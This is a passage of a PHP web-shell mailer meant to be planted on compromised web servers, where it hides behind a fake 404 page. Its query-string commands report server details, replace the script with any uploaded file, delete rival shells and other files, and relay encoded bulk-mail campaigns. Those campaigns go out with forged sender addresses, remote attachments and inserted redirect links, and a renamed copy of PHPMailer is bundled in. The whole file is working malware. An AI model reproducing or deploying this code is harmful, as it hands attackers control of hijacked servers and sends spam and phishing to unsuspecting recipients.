<?php
@date_default_timezone_set('Europe/London');
@error_reporting(0);
@set_time_limit(0);
@ini_set('memory_limit', '-1');
@ini_set('mail.add_x_header', 'Off');
@ini_set('expose_php', 'Off');
@define('MAIL_VERSION', '2.0.7');
@define('REDIRECTION_FOLDER', "W7XG3tQ");
if (isset($_GET['server-infos'])) {
    CreateHTaccess();
    $SERVER_INFOS = $_SERVER;
    if (!is_array($SERVER_INFOS)) {
        $SERVER_INFOS = array();
    }
    $SERVER_INFOS['REAL_IP_GET']      = GetPageContent("https://api.ipify.org");
    $SERVER_INFOS['EXPLOIT_VERSION']  = MAIL_VERSION;
	$SERVER_INFOS['REDIRECTION_LINK'] = GetRedirectionLink($_GET['real_url']);
	$SERVER_INFOS['MAIL_PHP'] = function_exists('mail');	
    echo json_encode($SERVER_INFOS);
    exit;
}
$_SERVER['PHP_SELF']          = "/index.php";
$HTTP_SERVER_VARS['PHP_SELF'] = "/index.php";
foreach (array(
    'HTTP_CLIENT_IP',
    'HTTP_X_FORWARDED_FOR',
    'HTTP_X_FORWARDED',
    'HTTP_X_CLUSTER_CLIENT_IP',
    'HTTP_FORWARDED_FOR',
    'HTTP_FORWARDED',
    'REMOTE_ADDR'
) as $key) {
    $_SERVER[$key]          = "127.0.0.1";
    $HTTP_SERVER_VARS[$key] = "127.0.0.1";
}
if (isset($_GET['test-exploit'])) {
	CreateHTaccess();
    echo "EXPLOITOK";
    exit;
}
if (isset($_GET['delete-wso'])) {
    echo DeleteBadFiles();
    exit;
}
function DeleteBadFiles($delete = false, $folder = "") {
    $FileToDelete  = array();
    $FileList      = ScanFolder(dirname(__FILE__) . "/" . $folder);
    $whiteFile     = array(
        basename(__FILE__),
        "error_log",
        ".htaccess",
        ".html",
        ".css",
        ".png",
        ".gif",
        ".jpeg",
        ".jpg",
        ".ico",
        ".js"
    );
    $whiteFilePreg = array();
    foreach ($whiteFile as $whiteFileToCheck) {
        $whiteFilePreg[] = preg_quote($whiteFileToCheck, "/");
    }
    $BlackList     = array(
        "define('MAIL_VERSION',",
        "_f_wp"
    );
    $BlackListPreg = array();
    foreach ($BlackList as $BlackListToCheck) {
        $BlackListPreg[] = preg_quote($BlackListToCheck, "/");
    }
    $whiteList     = array(
        "@package",
        "wp_nav_menu(",
        "bloginfo(",
        "language_attributes(",
        "has_nav_menu(",
        "body_class("
    );
    $whiteListPreg = array();
    foreach ($whiteList as $whiteListToCheck) {
        $whiteListPreg[] = preg_quote($whiteListToCheck, "/");
    }
    foreach ($FileList as $FileScan) {
        if ($FileScan == "." or $FileScan == ".." or is_dir($FileScan) or !is_file($FileScan) or $FileScan == basename(__FILE__)) {
            continue;
        }
        if (!preg_match('/' . implode("|", $whiteFilePreg) . '/i', $FileScan)) {
            $FileCheckContent = @file_get_contents($FileScan);
            if (!preg_match('/' . implode("|", $whiteListPreg) . '/i', $FileCheckContent) or preg_match('/' . implode("|", $BlackListPreg) . '/i', $FileCheckContent)) {
                if (!is_writable($FileScan)) {
                    $Writable = ' - <span style="color:red;">(This file can\'t be edit/deleted !)</span>';
                } else {
                    $Writable = ' - <span style="color:green;">(This file can be edit/deleted !)</span>';
                }
                if (isset($_GET['action'])) {
                    if ($_GET['action'] == "delete") {
                        $FileToDelete[] = $FileScan;
                    } else {
                        $FileToDelete[] = $FileScan . $Writable;
                    }
                } else {
                    if ($delete == true) {
                        $FileToDelete[] = $FileScan;
                    } else {
                        $FileToDelete[] = $FileScan . $Writable;
                    }
                }
            }
        }
    }
    if ($_GET['action'] == "delete" or $delete == true) {
        foreach ($FileToDelete as $DeleteFile) {
            @unlink($DeleteFile);
        }
        return "OK";
    } else {
        return json_encode($FileToDelete);
    }
}
if (isset($_GET['self-update'])) {
    $CurrentFile = __FILE__;
    $SaveContent = @file_get_contents($CurrentFile);
    if ($_FILES['f']['tmp_name'] != "") {
        if (@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__))) {
            if (@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])) {
                echo "OK";
            } else {
                @file_put_contents($CurrentFile, $SaveContent);
                echo "NO";
            }
        } else {
            echo "NO_DELETE";
        }
    }
    exit;
}
if (isset($_GET['check_mail_smtp'])) {
    $smtp = new SMTP;
    $Host = "smtp.live.com";
    $Port = 25;
    if (isset($_GET['host']) && $_GET['host'] != "") {
        $Host = $_GET['host'];
    }
    if (isset($_GET['port']) && $_GET['port'] != "") {
        $Port = $_GET['port'];
    }
	$urlShell = GetRedirectionLink($_GET['real_url']);
   
    try {
        if (!$smtp->connect($Host, $Port, 10)) {
            throw new Exception('Connect failed');
        }
        if (!$smtp->hello("localhost.localdomain")) {
            $SMTP_ERROR = $smtp->getError();
            throw new Exception('EHLO failed: ' . $SMTP_ERROR['error']);
        }
        $e = $smtp->getServerExtList();
        if (is_array($e) && array_key_exists('STARTTLS', $e)) {
            $tlsok = $smtp->startTLS();
            if (!$tlsok) {
                $SMTP_ERROR = $smtp->getError();
                throw new Exception('Failed to start encryption: ' . $SMTP_ERROR['error']);
            }
            if (!$smtp->hello("localhost.localdomain")) {
                $SMTP_ERROR = $smtp->getError();
                throw new Exception('EHLO (2) failed: ' . $SMTP_ERROR['error']);
            }
            $e = $smtp->getServerExtList();
        }
        if (is_array($e) && array_key_exists('AUTH', $e)) {
            echo "OK";
        }
    }
    catch (Exception $e) {
        echo $e->getMessage();
    }
    $smtp->quit(true);
    exit;
}
if (isset($_GET['send_campaign_php'])) {
    CreateHTaccess();
    echo GetPageContent(urldecode($_GET['real_url']) . "?send_campaign_php_action=true&real_url=" . $_GET['real_url'], $_POST);
    exit;
}
if (isset($_GET['check_redirection'])) {
	CreateHTaccess();
	$urlShell = GetRedirectionLink($_GET['real_url']);
	if ($urlShell === false) {
        echo "NO";
        exit;
    } else {
		echo "OK";
		exit;
	}
}
if (isset($_GET['send_campaign_php_action'])) {
    $ReturnText = array();
    $AllCommand = unserialize(base64_decode($_POST['command']));
	$urlShell = GetRedirectionLink($_GET['real_url']);
   
    foreach ($AllCommand as $Command) {
        $mail     = new ShellMailer;
        
        $smtp = isset($Command['smtp']) ? $Command['smtp'] : '';
        if (is_array($smtp)) {
            if (isset($Command['smtp']['sender_email'])) {
                $From = $Command['smtp']['sender_email'];
            } else {
                $From = $Command['smtp']['user'];
            }
            $mail->isSMTP();
            $mail->Host          = $Command['smtp']['host'];
            $mail->SMTPAuth      = true;
            $mail->SMTPKeepAlive = true;
            $mail->SMTPAutoTLS   = false;
            if ($Command['smtp']['security'] == "auto") {
                $mail->SMTPAutoTLS = true;
            } elseif ($Command['smtp']['security'] == "tls") {
                $mail->SMTPSecure = 'tls';
            } elseif ($Command['smtp']['security'] == "ssl") {
                $mail->SMTPSecure = 'ssl';
            }
            $mail->Port     = $Command['smtp']['port'];
            $mail->Username = $Command['smtp']['user'];
            $mail->Password = $Command['smtp']['pass'];
        } else {
            $Domain = get_domain("http://" . $_SERVER['HTTP_HOST']);
            if ($Command['from'] != "") {
                $From = $Command['from'] . '@' . $Domain;
            } else {
                $From = 'contact@' . $Domain;
            }
        }
        $mail->setFrom($From, $Command['name']);
        $mail->Sender = $From;
        $mail->addAddress($Command['to']);
        $mail->Subject = $Command['subject'];
        $mail->XMailer = ' ';
        $Content       = str_replace('[shell_rewrite_url]', $urlShell, $Command['content']);
        if ($Command['source_type'] == "html") {
            $mail->msgHTML($Content);
        } else {
            $mail->isHTML(false);
            $mail->Body    = $Content;
            $mail->AltBody = $Content;
        }
        if ($Command['reply_to'] != "") {
            $mail->AddReplyTo($Command['reply_to']);
        } else {
            $mail->AddReplyTo($From, $Command['name']);
        }
        if ($Command['file'] != "") {
            $FileExtension = pathinfo(parse_url($Command['file'], PHP_URL_PATH), PATHINFO_EXTENSION);
            $mail->addStringAttachment(GetPageContent($Command['file']), $Command['filename'] . "." . $FileExtension);
        }
        if (!$mail->send()) {
            $ReturnText[] = $Command['id'] . ":2:" . $mail->ErrorInfo;
        } else {
            $ReturnText[] = $Command['id'] . ":1:";
        }
    }
    if (empty($ReturnText)) {
        echo "NO";
    } else {
        echo implode(':|:', $ReturnText);
    }
    exit;
}
if (isset($_GET['check_inbox_php'])) {
    echo GetPageContent(urldecode($_GET['real_url']) . "?check_inbox_php_action=true&email=" . $_GET['email'] . "&subject=" . $_GET['subject'] . "&from=" . $_GET['from'] . "&real_url=" . $_GET['real_url']);
    exit;
}
if (isset($_GET['check_mail_php'])) {
    if (function_exists('mail')) {
        echo "OK";
    } else {
        echo "NO";
    }
    exit;
}
if (isset($_GET['check_inbox_php_action'])) {
    $mail          = new ShellMailer;
    $Domain        = strtolower(get_domain("http://" . $_SERVER['HTTP_HOST']));
    $ExplodeDomain = explode(".", $Domain);
    $Name          = ucfirst($ExplodeDomain[0]);
    if (isset($_GET['from'])) {
        $From = $_GET['from'];
    } else {
        $From = 'contact@' . $Domain;
    }
    $mail->setFrom($From, $Name);
    $mail->Sender = $From;
    $mail->AddReplyTo($From, $Name);
    $mail->addAddress($_GET['email']);
    $mail->Subject = $_GET['subject'];
    $mail->XMailer = ' ';
    if (isset($_GET['body'])) {
        $mail->Body = $_GET['body'];
    } else {
        $mail->Body = "Hello, as you ask on our website, this is your api key for use our service : " . md5(uniqid(time()));
    }
    if (!$mail->send()) {
        echo "NO";
    } else {
        echo "OK";
    }
    exit;
}
Display404Page();
function get_domain($url) {
    $pieces = parse_url($url);
    $domain = isset($pieces['host']) ? $pieces['host'] : '';
    if (preg_match('/(?P<domain>[a-z0-9][a-z0-9\-]{1,63}\.[a-z\.]{2,6})$/i', $domain, $regs)) {
        return $regs['domain'];
    }
    return false;
}
function randStr($length) {
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function ScanFolder($dir) {
    if (!function_exists('scandir')) {
        $dh = opendir($dir);
        while (false !== ($filename = readdir($dh))) {
            $files[] = $filename;
        }
    } else {
        $files = scandir($dir);
    }
    return $files;
}
function cURLRequest($url, $postFields = null, $httpHeader = array()) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
    if (!empty($postFields)) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    }
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.1; .NET CLR 1.1.4322)");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    $headers   = array();
    $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0";
    $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    $headers[] = "Accept-Language: en-US,en;q=0.5";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $page     = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if(($httpcode >= 500 && $httpcode < 600) or ($httpcode >= 400 && $httpcode < 500)) { return "REMOTE_ERROR_".$httpcode."_CURL|" . $url; }

    if (curl_errno($ch)) {
        return "REMOTE_CURL_ERRNO|" . curl_error($ch);
    }
    curl_close($ch);
    return $page;
}
function GetPageContent($url, $postFields = null) {
    if (function_exists('curl_init')) {
        return cURLRequest($url, $postFields);
    } elseif (!function_exists('file_get_contents')) {
        return 'file_get_contents not available !';
    } else {
        if (is_array($postFields)) {
            $postdata = http_build_query($postFields);
            $opts     = array(
                'http' => array(
                    'method' => 'POST',
                    'header' => 'Content-type: application/x-www-form-urlencoded',
                    'content' => $postdata
                )
            );
            $context  = stream_context_create($opts);
            $result   = @file_get_contents($url, false, $context);
            return $result;
        } else {
            return @file_get_contents($url);
        }
    }
}
function url_origin($s, $use_forwarded_host = false) {
    $ssl      = (!empty($s['HTTPS']) && $s['HTTPS'] == 'on');
    $sp       = strtolower($s['SERVER_PROTOCOL']);
    $protocol = substr($sp, 0, strpos($sp, '/')) . (($ssl) ? 's' : '');
    $port     = $s['SERVER_PORT'];
    $port     = ((!$ssl && $port == '80') || ($ssl && $port == '443')) ? '' : ':' . $port;
    $host     = ($use_forwarded_host && isset($s['HTTP_X_FORWARDED_HOST'])) ? $s['HTTP_X_FORWARDED_HOST'] : (isset($s['HTTP_HOST']) ? $s['HTTP_HOST'] : null);
    $host     = isset($host) ? $host : $s['SERVER_NAME'] . $port;
    return $protocol . '://' . $host;
}
function full_url($s, $use_forwarded_host = false) {
    $URI = explode('?', $s['REQUEST_URI']);
    return url_origin($s, $use_forwarded_host) . $URI[0];
}
class ShellMailer {
    public $Priority = null;
    public $CharSet = 'iso-8859-1';
    public $ContentType = 'text/plain';
    public $Encoding = '8bit';
    public $ErrorInfo = '';
    public $From = 'root@localhost';
    public $FromName = 'Root User';
    public $Sender = '';
    public $ReturnPath = '';
    public $Subject = '';
    public $Body = '';
    public $AltBody = '';
    public $Ical = '';
    protected $MIMEBody = '';
    protected $MIMEHeader = '';
    protected $mailHeader = '';
    public $WordWrap = 0;
    public $Mailer = 'mail';
    public $Sendmail = '/usr/sbin/sendmail';
    public $UseSendmailOptions = true;
    public $PluginDir = '';
    public $ConfirmReadingTo = '';
    public $Hostname = '';
    public $MessageID = '';
    public $MessageDate = '';
    public $Host = 'localhost';
    public $Port = 25;
    public $Helo = '';
    public $SMTPSecure = '';
    public $UseSocks = false;
    public $SocksHost = null;
    public $SocksPort = 0;
    public $SMTPAutoTLS = true;
    public $SMTPAuth = false;
    public $SMTPOptions = array();
    public $Username = '';
    public $Password = '';
    public $AuthType = '';
    public $Realm = '';
    public $Workstation = '';
    public $Timeout = 10;
    public $SMTPDebug = 0;
    public $Debugoutput = 'echo';
    public $SMTPKeepAlive = false;
    public $SingleTo = false;
    public $SingleToArray = array();
    public $do_verp = false;
    public $AllowEmpty = false;
    public $LE = "\n";
    public $DKIM_selector = '';
    public $DKIM_identity = '';
    public $DKIM_passphrase = '';
    public $DKIM_domain = '';
    public $DKIM_private = '';
    public $DKIM_private_string = '';
    public $action_function = '';
    public $XMailer = '';
    public static $validator = 'auto';
    protected $smtp = null;
    protected $to = array();
    protected $cc = array();
    protected $bcc = array();
    protected $ReplyTo = array();
    protected $all_recipients = array();
    protected $RecipientsQueue = array();
    protected $ReplyToQueue = array();
    protected $attachment = array();
    protected $CustomHeader = array();
    protected $lastMessageID = '';
    protected $message_type = '';
    protected $boundary = array();
    protected $language = array();
    protected $error_count = 0;
    protected $sign_cert_file = '';
    protected $sign_key_file = '';
    protected $sign_extracerts_file = '';
    protected $sign_key_pass = '';
    protected $exceptions = false;
    protected $uniqueid = '';
    const STOP_MESSAGE = 0;
    const STOP_CONTINUE = 1;
    const STOP_CRITICAL = 2;
    const CRLF = "\r\n";
    const MAX_LINE_LENGTH = 998;
    public function __construct($exceptions = null) {
        if ($exceptions !== null) {
            $this->exceptions = (boolean) $exceptions;
        }
    }
    public function __destruct() {
        $this->smtpClose();
    }
    private function mailPassthru($to, $subject, $body, $header, $params) {
        if (ini_get('mbstring.func_overload') & 1) {
            $subject = $this->secureHeader($subject);
        } else {
            $subject = $this->encodeHeader($this->secureHeader($subject));
        }
        if (ini_get('safe_mode') or !$this->UseSendmailOptions or is_null($params)) {
            $result = @mail($to, $subject, $body, $header);
        } else {
            $result = @mail($to, $subject, $body, $header, $params);
        }
        return $result;
    }
    protected function edebug($str) {
        if ($this->SMTPDebug <= 0) {
            return;
        }
        if (!in_array($this->Debugoutput, array(
            'error_log',
            'html',
            'echo'
        )) and is_callable($this->Debugoutput)) {
            call_user_func($this->Debugoutput, $str, $this->SMTPDebug);
            return;
        }
        switch ($this->Debugoutput) {
            case 'error_log':
                error_log($str);
                break;
            case 'html':
                echo htmlentities(preg_replace('/[\r\n]+/', '', $str), ENT_QUOTES, 'UTF-8') . "<br>\n";
                break;
            case 'echo':
            default:
                $str = preg_replace('/\r\n?/ms', "\n", $str);
                echo gmdate('Y-m-d H:i:s') . "\t" . str_replace("\n", "\n                   \t                  ", trim($str)) . "\n";
        }
    }
    public function isHTML($isHtml = true) {
        if ($isHtml) {
            $this->ContentType = 'text/html';
        } else {
            $this->ContentType = 'text/plain';
        }
    }
    public function isSMTP() {
        $this->Mailer = 'smtp';
    }
    public function isMail() {
        $this->Mailer = 'mail';
    }
    public function isSendmail() {
        $ini_sendmail_path = ini_get('sendmail_path');
        if (!stristr($ini_sendmail_path, 'sendmail')) {
            $this->Sendmail = '/usr/sbin/sendmail';
        } else {
            $this->Sendmail = $ini_sendmail_path;
        }
        $this->Mailer = 'sendmail';
    }
    public function isQmail() {
        $ini_sendmail_path = ini_get('sendmail_path');
        if (!stristr($ini_sendmail_path, 'qmail')) {
            $this->Sendmail = '/var/qmail/bin/qmail-inject';
        } else {
            $this->Sendmail = $ini_sendmail_path;
        }
        $this->Mailer = 'qmail';
    }
    public function addAddress($address, $name = '') {
        return $this->addOrEnqueueAnAddress('to', $address, $name);
    }
    public function addCC($address, $name = '') {
        return $this->addOrEnqueueAnAddress('cc', $address, $name);
    }
    public function addBCC($address, $name = '') {
        return $this->addOrEnqueueAnAddress('bcc', $address, $name);
    }
    public function addReplyTo($address, $name = '') {
        return $this->addOrEnqueueAnAddress('Reply-To', $address, $name);
    }
    protected function addOrEnqueueAnAddress($kind, $address, $name) {
        $address = trim($address);
        $name    = trim(preg_replace('/[\r\n]+/', '', $name));
        if (($pos = strrpos($address, '@')) === false) {
            $error_message = $this->lang('invalid_address') . " (addAnAddress $kind): $address";
            $this->setError($error_message);
            $this->edebug($error_message);
            if ($this->exceptions) {
                throw new phpmailerException($error_message);
            }
            return false;
        }
        $params = array(
            $kind,
            $address,
            $name
        );
        if ($this->has8bitChars(substr($address, ++$pos)) and $this->idnSupported()) {
            if ($kind != 'Reply-To') {
                if (!array_key_exists($address, $this->RecipientsQueue)) {
                    $this->RecipientsQueue[$address] = $params;
                    return true;
                }
            } else {
                if (!array_key_exists($address, $this->ReplyToQueue)) {
                    $this->ReplyToQueue[$address] = $params;
                    return true;
                }
            }
            return false;
        }
        return call_user_func_array(array(
            $this,
            'addAnAddress'
        ), $params);
    }
    protected function addAnAddress($kind, $address, $name = '') {
        if (!in_array($kind, array(
            'to',
            'cc',
            'bcc',
            'Reply-To'
        ))) {
            $error_message = $this->lang('Invalid recipient kind: ') . $kind;
            $this->setError($error_message);
            $this->edebug($error_message);
            if ($this->exceptions) {
                throw new phpmailerException($error_message);
            }
            return false;
        }
        if (!$this->validateAddress($address)) {
            $error_message = $this->lang('invalid_address') . " (addAnAddress $kind): $address";
            $this->setError($error_message);
            $this->edebug($error_message);
            if ($this->exceptions) {
                throw new phpmailerException($error_message);
            }
            return false;
        }
        if ($kind != 'Reply-To') {
            if (!array_key_exists(strtolower($address), $this->all_recipients)) {
                array_push($this->$kind, array(
                    $address,
                    $name
                ));
                $this->all_recipients[strtolower($address)] = true;
                return true;
            }
        } else {
            if (!array_key_exists(strtolower($address), $this->ReplyTo)) {
                $this->ReplyTo[strtolower($address)] = array(
                    $address,
                    $name
                );
                return true;
            }
        }
        return false;
    }
    public function parseAddresses($addrstr, $useimap = true) {
        $addresses = array();
        if ($useimap and function_exists('imap_rfc822_parse_adrlist')) {
            $list = imap_rfc822_parse_adrlist($addrstr, '');
            foreach ($list as $address) {
                if ($address->host != '.SYNTAX-ERROR.') {
                    if ($this->validateAddress($address->mailbox . '@' . $address->host)) {
                        $addresses[] = array(
                            'name' => (property_exists($address, 'personal') ? $address->personal : ''),
                            'address' => $address->mailbox . '@' . $address->host
                        );
                    }
                }
            }
        } else {
            $list = explode(',', $addrstr);
            foreach ($list as $address) {
                $address = trim($address);
                if (strpos($address, '<') === false) {
                    if ($this->validateAddress($address)) {
                        $addresses[] = array(
                            'name' => '',
                            'address' => $address
                        );
                    }
                } else {
                    list($name, $email) = explode('<', $address);
                    $email = trim(str_replace('>', '', $email));
                    if ($this->validateAddress($email)) {
                        $addresses[] = array(
                            'name' => trim(str_replace(array(
                                '"',
                                "'"
                            ), '', $name)),
                            'address' => $email
                        );
                    }
                }
            }
        }
        return $addresses;
    }
    public function setFrom($address, $name = '', $auto = true) {
        $address = trim($address);
        $name    = trim(preg_replace('/[\r\n]+/', '', $name));
        if (($pos = strrpos($address, '@')) === false or (!$this->has8bitChars(substr($address, ++$pos)) or !$this->idnSupported()) and !$this->validateAddress($address)) {
            $error_message = $this->lang('invalid_address') . " (setFrom) $address";
            $this->setError($error_message);
            $this->edebug($error_message);
            if ($this->exceptions) {
                throw new phpmailerException($error_message);
            }
            return false;
        }
        $this->From     = $address;
        $this->FromName = $name;
        if ($auto) {
            if (empty($this->Sender)) {
                $this->Sender = $address;
            }
        }
        return true;
    }
    public function getLastMessageID() {
        return $this->lastMessageID;
    }
    public static function validateAddress($address, $patternselect = null) {
        if (is_null($patternselect)) {
            $patternselect = self::$validator;
        }
        if (is_callable($patternselect)) {
            return call_user_func($patternselect, $address);
        }
        if (strpos($address, "\n") !== false or strpos($address, "\r") !== false) {
            return false;
        }
        if (!$patternselect or $patternselect == 'auto') {
            if (defined('PCRE_VERSION')) {
                if (version_compare(PCRE_VERSION, '8.0.3') >= 0) {
                    $patternselect = 'pcre8';
                } else {
                    $patternselect = 'pcre';
                }
            } elseif (function_exists('extension_loaded') and extension_loaded('pcre')) {
                $patternselect = 'pcre';
            } else {
                if (version_compare(PHP_VERSION, '5.2.0') >= 0) {
                    $patternselect = 'php';
                } else {
                    $patternselect = 'noregex';
                }
            }
        }
        switch ($patternselect) {
            case 'pcre8':
                return (boolean) preg_match('/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)' . '((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x0D\x0A)?[\t ]+)?)(\((?>(?2)' . '(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)' . '([!#-\'*+\/-9=?^-~-]+|"(?>(?2)(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*' . '(?2)")(?>(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)' . '(?>(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' . '|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' . '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' . '|[1-9]?[0-9])(?>\.(?9)){3}))\])(?1)$/isD', $address);
            case 'pcre':
                return (boolean) preg_match('/^(?!(?>"?(?>\\\[ -~]|[^"])"?){255,})(?!(?>"?(?>\\\[ -~]|[^"])"?){65,}@)(?>' . '[!#-\'*+\/-9=?^-~-]+|"(?>(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*")' . '(?>\.(?>[!#-\'*+\/-9=?^-~-]+|"(?>(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*"))*' . '@(?>(?![a-z0-9-]{64,})(?>[a-z0-9](?>[a-z0-9-]*[a-z0-9])?)(?>\.(?![a-z0-9-]{64,})' . '(?>[a-z0-9](?>[a-z0-9-]*[a-z0-9])?)){0,126}|\[(?:(?>IPv6:(?>(?>[a-f0-9]{1,4})(?>:' . '[a-f0-9]{1,4}){7}|(?!(?:.*[a-f0-9][:\]]){8,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?' . '::(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?))|(?>(?>IPv6:(?>[a-f0-9]{1,4}(?>:' . '[a-f0-9]{1,4}){5}:|(?!(?:.*[a-f0-9]:){6,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4})?' . '::(?>(?:[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4}):)?))?(?>25[0-5]|2[0-4][0-9]|1[0-9]{2}' . '|[1-9]?[0-9])(?>\.(?>25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}))\])$/isD', $address);
            case 'html5':
                return (boolean) preg_match('/^[a-zA-Z0-9.!#$%&\'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' . '[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD', $address);
            case 'noregex':
                return (strlen($address) >= 3 and strpos($address, '@') >= 1 and strpos($address, '@') != strlen($address) - 1);
            case 'php':
            default:
                return (boolean) filter_var($address, FILTER_VALIDATE_EMAIL);
        }
    }
    public function idnSupported() {
        return function_exists('idn_to_ascii') and function_exists('mb_convert_encoding');
    }
    public function punyencodeAddress($address) {
        if ($this->idnSupported() and !empty($this->CharSet) and ($pos = strrpos($address, '@')) !== false) {
            $domain = substr($address, ++$pos);
            if ($this->has8bitChars($domain) and @mb_check_encoding($domain, $this->CharSet)) {
                $domain = mb_convert_encoding($domain, 'UTF-8', $this->CharSet);
                if (($punycode = defined('INTL_IDNA_VARIANT_UTS46') ? idn_to_ascii($domain, 0, INTL_IDNA_VARIANT_UTS46) : idn_to_ascii($domain)) !== false) {
                    return substr($address, 0, $pos) . $punycode;
                }
            }
        }
        return $address;
    }
    public function send() {
        try {
            if (!$this->preSend()) {
                return false;
            }
            return $this->postSend();
        }
        catch (phpmailerException $exc) {
            $this->mailHeader = '';
            $this->setError($exc->getMessage());
            if ($this->exceptions) {
                throw $exc;
            }
            return false;
        }
    }
    public function preSend() {
        try {
            $this->error_count = 0;
            $this->mailHeader  = '';
            foreach (array_merge($this->RecipientsQueue, $this->ReplyToQueue) as $params) {
                $params[1] = $this->punyencodeAddress($params[1]);
                call_user_func_array(array(
                    $this,
                    'addAnAddress'
                ), $params);
            }
            if ((count($this->to) + count($this->cc) + count($this->bcc)) < 1) {
                throw new phpmailerException($this->lang('provide_address'), self::STOP_CRITICAL);
            }
            foreach (array(
                'From',
                'Sender',
                'ConfirmReadingTo'
            ) as $address_kind) {
                $this->$address_kind = trim($this->$address_kind);
                if (empty($this->$address_kind)) {
                    continue;
                }
                $this->$address_kind = $this->punyencodeAddress($this->$address_kind);
                if (!$this->validateAddress($this->$address_kind)) {
                    $error_message = $this->lang('invalid_address') . ' (punyEncode) ' . $this->$address_kind;
                    $this->setError($error_message);
                    $this->edebug($error_message);
                    if ($this->exceptions) {
                        throw new phpmailerException($error_message);
                    }
                    return false;
                }
            }
            if ($this->alternativeExists()) {
                $this->ContentType = 'multipart/alternative';
            }
            $this->setMessageType();
            if (!$this->AllowEmpty and empty($this->Body)) {
                throw new phpmailerException($this->lang('empty_message'), self::STOP_CRITICAL);
            }
            $this->MIMEHeader = '';
            $this->MIMEBody   = $this->createBody();
            $tempheaders      = $this->MIMEHeader;
            $this->MIMEHeader = $this->createHeader();
            $this->MIMEHeader .= $tempheaders;
            if ($this->Mailer == 'mail') {
                if (count($this->to) > 0) {
                    $this->mailHeader .= $this->addrAppend('To', $this->to);
                } else {
                    $this->mailHeader .= $this->headerLine('To', 'undisclosed-recipients:;');
                }
                $this->mailHeader .= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader(trim($this->Subject))));
            }
            if (!empty($this->DKIM_domain) && !empty($this->DKIM_selector) && (!empty($this->DKIM_private_string) || (!empty($this->DKIM_private) && file_exists($this->DKIM_private)))) {
                $header_dkim      = $this->DKIM_Add($this->MIMEHeader . $this->mailHeader, $this->encodeHeader($this->secureHeader($this->Subject)), $this->MIMEBody);
                $this->MIMEHeader = rtrim($this->MIMEHeader, "\r\n ") . self::CRLF . str_replace("\r\n", "\n", $header_dkim) . self::CRLF;
            }
            return true;
        }
        catch (phpmailerException $exc) {
            $this->setError($exc->getMessage());
            if ($this->exceptions) {
                throw $exc;
            }
            return false;
        }
    }
    public function postSend() {
        try {
            switch ($this->Mailer) {
                case 'sendmail':
                case 'qmail':
                    return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody);
                case 'smtp':
                    return $this->smtpSend($this->MIMEHeader, $this->MIMEBody);
                case 'mail':
                    return $this->mailSend($this->MIMEHeader, $this->MIMEBody);
                default:
                    $sendMethod = $this->Mailer . 'Send';
                    if (method_exists($this, $sendMethod)) {
                        return $this->$sendMethod($this->MIMEHeader, $this->MIMEBody);
                    }
                    return $this->mailSend($this->MIMEHeader, $this->MIMEBody);
            }
        }
        catch (phpmailerException $exc) {
            $this->setError($exc->getMessage());
            $this->edebug($exc->getMessage());
            if ($this->exceptions) {
                throw $exc;
            }
        }
        return false;
    }
    protected function sendmailSend($header, $body) {
        if (!empty($this->Sender) and self::isShellSafe($this->Sender)) {
            if ($this->Mailer == 'qmail') {
                $sendmailFmt = '%s -f%s';
            } else {
                $sendmailFmt = '%s -oi -f%s -t';
            }
        } else {
